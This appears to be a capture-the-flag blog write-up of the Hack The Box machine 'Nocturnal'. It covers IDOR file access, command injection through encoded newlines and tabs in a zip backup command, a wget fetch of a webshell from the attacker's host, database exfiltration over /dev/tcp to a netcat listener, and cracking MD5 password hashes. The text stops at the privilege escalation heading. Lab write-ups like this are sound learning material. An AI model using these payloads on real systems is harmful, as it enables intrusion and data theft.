---
layout: post
title: 'Hack The Box - Machine Write-Up: Nocturnal'
created-at: 2025-05-04
categories: ["Hack The Box", "WriteUp", "Cybersecurity"]
image: /docs/assets/2025-05/htb-nocturnal-0.png
---

## Enumeration and Analysis

When accessing the IP directly on the browser, we are automatically redirected to `nocturnal.htb`. So I added the domain to my `/etc/hosts`:

```
> echo "10.10.11.64     nocturnal.htb" >> /etc/hosts
```

![Landing page](/docs/assets/2025-05/htb-nocturnal-1.png)

And scanning for the open ports:

> nmap nocturnal.htb

```
> nmap -p22,80 -sCV nocturnal.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 08:20 EDT
Nmap scan report for nocturnal.htb (10.10.11.64)
Host is up (0.023s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Welcome to Nocturnal
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.88 seconds
```

---

From here, you can register a new account and log into it. Here you can upload and retrieve your own files.

![Upload page](/docs/assets/2025-05/htb-nocturnal-2.png)

> I tried different code injection methods since the upload is limited to extensions pdf, doc, docx, xls, xlsx and odt.

When clicking a file, the retrieval path expects two parameters: `username` and `file`. And when trying to retrieve a file that doesn't exist, a list of available files is shown on the page.

This page doesn't seem to validate the queried username against the current active session, meaning that I can access other user's files.

I used `wfuzz` to list usernames that return a different content size other than the "User not found error page":

```
> wfuzz -c -u "http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx" -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -H "Cookie:PHPSESSID=0k9ccd53m5om1ou8nll9k8r7or" --hh 2985
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=shell.docx
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                             
=====================================================================

000000086:   200        128 L    247 W      3037 Ch     "admin"                                             
000000375:   200        128 L    253 W      3481 Ch     "amanda"                                            
000002409:   500        122 L    236 W      2919 Ch     "dear"                                              
000002408:   500        122 L    236 W      2919 Ch     "deanne"                                            
000002407:   500        122 L    236 W      2919 Ch     "de-anna"                                           
000002406:   500        122 L    236 W      2919 Ch     "deanna"                                            
000002404:   500        122 L    236 W      2919 Ch     "deane"                                             
000002405:   500        122 L    236 W      2919 Ch     "deann"                                             
000002401:   500        122 L    236 W      2919 Ch     "deana"                                             
000002402:   500        122 L    236 W      2919 Ch     "deandra"                                           
000002400:   500        122 L    236 W      2919 Ch     "dean"                                              
000002399:   500        122 L    236 W      2919 Ch     "deacon"                                            
000002398:   500        122 L    236 W      2919 Ch     "de"                                                
000002397:   500        122 L    236 W      2919 Ch     "ddene"                                             
000002394:   500        122 L    236 W      2919 Ch     "dayna"                                             
000002396:   500        122 L    236 W      2919 Ch     "dayton"                                            
000002439:   500        122 L    236 W      2919 Ch     "deja"                                              
000002390:   500        122 L    236 W      2919 Ch     "daya"                                              
000002392:   500        122 L    236 W      2919 Ch     "daylen"                                            
000002393:   500        122 L    236 W      2919 Ch     "daylon"                                            
000002441:   500        122 L    236 W      2919 Ch     "del"                                               
000006619:   200        128 L    248 W      3103 Ch     "me"                                                
000007640:   200        128 L    247 W      3037 Ch     "peter"                                             
000008867:   200        128 L    268 W      6130 Ch     "sol"                                               
000009382:   200        128 L    247 W      3037 Ch     "tobias"                                            

Total time: 38.68700
Processed Requests: 10177
Filtered Requests: 10152
Requests/sec.: 263.0599    
```

## Admin access

Looking through some of the users, the user `amanda` have a file called `privacy.odt` with the following content:

```
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
```

Logging in as `amanda`, it looks like she has admin access:

![Amanda's page](/docs/assets/2025-05/htb-nocturnal-3.png)

![Admin's page](/docs/assets/2025-05/htb-nocturnal-4.png)

From here, I can access the source code and create backups.

Looking at the source code of the admin page, the building of the `zip` command looks really problematic, and susceptible to command injection.

I tried a lot of different payloads, but what worked out was fuzzing with [this](https://github.com/payloadbox/command-injection-payload-list) command injection wordlist. Specifically the payload `%0Aid` which gave back:

```
id: extra operand '.'
Try 'id --help' for more information.
```

And `%0Aid%0A`, which gave back

```
sh: 3: backups/backup_2025-05-05.zip: Permission denied
```

It looks like I can send a encoded line break, and it is used as a command delimiter.

After some more testing, I saw that a encoded tab `%09` works as a space for the commands (thank you Claude).

Using these two substitutions I was able to execute a `wget` and download a webshell to the target machine using the following payload: `%0A/usr/bin/wget%09<tun0 ip>:1337/shell.php%0A`.

This essentially translates to this when getting parsed:

```

/usr/bin/wget	<tun0 ip>:1337/shell.php

```

Transforming the command into:

```
zip -x './backups/*' -r -P 
/usr/bin/wget	<tun0 ip>:1337/shell.php
 backups/backup_2025-05-05.zip > logfile.txt 2>&1 &
```

And even though we get a `sh: 3: backups/backup_2025-05-05.zip: not found` error on the page (because the command on line 3 is wrong and will fail), we can see a hit on the API: 

```
> python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
<tun0 ip> - - [05/May/2025 xx:xx:xx] "GET /shell.php HTTP/1.1" 200 -
```

And refreshing the page, we can also see the file available on the root directory.

## Lateral movement

Looking through the directory (and remembering earlier code), there is a `sqlite` database under `../nocturnal_database/nocturnal_database.db`. I can use retrieve the file using `netcat`.

Attacker machine:
```
> nc -nvlp 1339 > database.db
```

Target machine:
```
> cat ../nocturnal_database/nocturnal_database.db > /dev/tcp/<tun0 ip>/1339
```

The database has two tables, `uploads` and `users`.

```
sqlite> SELECT * FROM users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
6|kavi|f38cde1654b39fea2bd4f72f1ae4cdda
7|e0Al5|101ad4543a96a7fd84908fd0d802e7db
```

I remember earlier when looking through the code on the registration page, the password is stored as a simple MD5:

```
<?php
session_start();
$db = new SQLite3('../nocturnal_database/nocturnal_database.db');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = md5($_POST['password']);

    $stmt = $db->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);

    if ($stmt->execute()) {
        $_SESSION['success'] = 'User registered successfully!';
        header('Location: login.php');
        exit();
    } else {
        $error = 'Failed to register user.';
    }
}
?>

...
```

So this is a very fast `hashcat` search:

```
> hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```

This has match the user `tobias`. Checking for password reuse on SSH, we are in 😎.

```
tobias@nocturnal:~$ cat user.txt 
<user flag>
```

And we have the user flag.

## Privilege escalation